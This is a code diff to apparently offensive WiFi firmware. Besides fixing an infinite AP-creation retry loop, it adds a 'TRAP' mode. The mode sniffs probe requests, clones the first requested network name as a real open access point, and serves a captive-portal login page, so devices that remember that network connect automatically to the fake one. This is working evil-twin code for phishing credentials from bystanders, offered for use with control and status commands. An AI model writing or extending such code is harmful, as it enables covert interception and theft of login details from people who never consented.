@@ -206,7 +206,8 @@ void createAP(char* ssid, char* channel, char* password){
   DEBUG_SER_PRINT("CREATING AP");
   DEBUG_SER_PRINT(ssid);
   DEBUG_SER_PRINT(channel);
-  while (status != WL_CONNECTED) {
+  int tries = 0;
+  while (status != WL_CONNECTED && tries < 6) {
     DEBUG_SER_PRINT("CREATING AP 2");
       if(strcmp(password,"")==0){
         status = WiFi.apbegin(ssid, channel, (uint8_t) 0);
@@ -214,6 +215,13 @@ void createAP(char* ssid, char* channel, char* password){
         status = WiFi.apbegin(ssid, password, channel, (uint8_t) 0);
       }
       delay(1000);
+      tries++;
+  }
+  if(status != WL_CONNECTED) {
+    // Bounded retry: this loop used to be infinite, so a failed apbegin wedged loop() forever
+    // (no commands, no TX, no portal). Bail out instead and leave apActive alone.
+    DEBUG_SER_PRINT("AP FAILED");
+    return;
   }
   // Replace the SDK DHCP server with ours so we can advertise option 114 (RFC 8910),
   // which is what actually triggers Android 11+ captive-portal auto-open.
@@ -835,6 +843,14 @@ static int karma_chan = 6;
 static volatile bool karma_pending = false;
 static char karma_ssid[33] = {0};
 static uint8_t karma_client[6] = {0};
+// --- C1: KARMA -> Trap -----------------------------------------------------------------
+// Same sniffing as B1, but the first requested SSID is cloned for real: a softAP with that name
+// is started and the existing captive-portal plumbing serves the login page, so a device that
+// remembers the network can actually associate and land on the portal. Once the AP is up its own
+// beacons advertise the SSID, so the raw responses stop (they would also fight the AP's channel).
+static bool trap_on = false;
+static bool trap_armed = true;
+static char trap_ssid[33] = {0};
 #define KARMA_SEEN_MAX 16
 static char karma_seen[KARMA_SEEN_MAX][33];
 static int karma_seen_n = 0;
@@ -1320,7 +1336,8 @@ void loop() {
           server.begin();
           serveBegined=true;
         }
-        apActive = true;
+        // apActive is set by createAP() itself (and only when the AP actually came up), so a
+        // failed start no longer leaves the app thinking an AP is running.
 
     }else if(readString.substring(0,8)=="RICKROLL"){
       
@@ -1843,6 +1860,39 @@ void loop() {
       for(int i=0;i<secs;i++) delay(1000);
       wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
       probe_stream(ch);
+    }else if(readString.substring(0,8)=="TRAPSTAT"){
+      // C1: read-only status (a bare "TRAP" means "trap on", so a query needs its own name).
+      String r = String("TRAPSTAT:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
+                 " ap=" + String(apActive ? trap_ssid : "-") +
+                 " seen=" + String((unsigned)karma_seen_n);
+      Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,4)=="TRAP" && readString.charAt(4)==' '){
+      // C1: KARMA -> Trap. Args: TRAP <0|1> [chan]. Like KARMA but the first requested SSID is
+      // cloned as a real softAP (portal served), so the client can actually associate.
+      // The charAt guard keeps "TRAPSTAT"/"TRAPCTL" out of here - without it a status query would
+      // re-arm the trap and destroy the AP that is already up.
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
+      int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
+      if(ch >= 1 && ch <= 165) karma_chan = ch;
+      trap_on = (on != 0);
+      trap_armed = true;
+      trap_ssid[0] = 0;
+      karma_pending = false;
+      if(trap_on) {
+        karma_on = true;
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, karma_chan);
+        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
+      } else {
+        karma_on = false;
+        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+        if(apActive) { destroyAP(); apActive = false; }
+      }
+      String r = String("TRAPCTL:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
+                 " ap=" + String(apActive ? trap_ssid : "-");
+      Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,9)=="KARMALIST"){
       // B1: report the SSIDs the responder has seen, so the host can show them live.
       // NOTE: this must be tested BEFORE the "KARMA" handler below - "KARMALIST" starts with
@@ -2168,10 +2218,37 @@ void loop() {
     delay(50);
   }
 
-  // B1: answer a caught probe request (deferred out of the promisc callback).
+  // B1/C1: answer a caught probe request (deferred out of the promisc callback).
   if(karma_on && karma_pending) {
     karma_pending = false;
-    if(karma_ssid[0]) karma_respond(karma_ssid, karma_client, karma_chan);
+    if(karma_ssid[0]) {
+      if(trap_on && trap_armed) {
+        // C1: become that network for real, then let the portal do the work.
+        trap_armed = false;
+        strncpy(trap_ssid, karma_ssid, 32);
+        trap_ssid[32] = 0;
+        if(apActive) destroyAP();
+        // The driver cannot sniff and run a softAP at once: stop promisc first or apbegin fails.
+        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+        karma_on = false;
+        snprintf(ap_channel, sizeof(ap_channel), "%d", karma_chan);
+        secured = false;
+        build_portal_urls(trap_ssid);
+        createAP(trap_ssid, ap_channel);   // sets apActive itself, and now bails out on failure
+        if(apActive) {
+          String t = String("TRAP:") + trap_ssid;
+          Serial.println(t); Serial1.println(t);
+        } else {
+          // Could not clone it - go back to plain KARMA so probes still get answered.
+          trap_armed = true;
+          karma_on = true;
+          wext_set_channel(WLAN0_NAME, karma_chan);
+          wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
+          Serial.println("TRAPFAIL"); Serial1.println("TRAPFAIL");
+        }
+      }
+      if(karma_on && !apActive) karma_respond(karma_ssid, karma_client, karma_chan);
+    }
   }
 
   if (randomSSID){
